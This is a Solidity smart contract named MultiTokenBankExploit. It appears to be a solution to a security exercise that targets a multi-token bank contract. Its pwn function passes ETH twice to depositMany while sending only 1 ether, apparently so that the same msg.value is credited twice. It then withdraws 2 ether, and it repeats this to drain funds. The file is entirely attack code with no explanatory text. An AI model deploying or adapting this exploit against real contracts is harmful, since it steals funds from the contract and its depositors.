// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IMultiTokenBank {
  function balances(address, address) external view returns (uint256);

  function depositMany(address[] calldata, uint256[] calldata) external payable;

  function deposit(address, uint256) external payable;

  function withdraw(address, uint256) external;
}

contract MultiTokenBankExploit {
  address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

  IMultiTokenBank public bank;

  constructor(address _bank) {
    bank = IMultiTokenBank(_bank);
  }

  receive() external payable {}

  function _attack(address[] memory tokens, uint256[] memory amounts) private {
    bank.depositMany{ value: 1 ether }(tokens, amounts);
    bank.withdraw(ETH, 2 ether);
  }

  function pwn() external payable {
    address[] memory tokens = new address[](2);
    tokens[0] = ETH;
    tokens[1] = ETH;

    uint256[] memory amounts = new uint256[](2);
    amounts[0] = 1 ether;
    amounts[1] = 1 ether;

    _attack(tokens, amounts);
    _attack(tokens, amounts);
  }
}
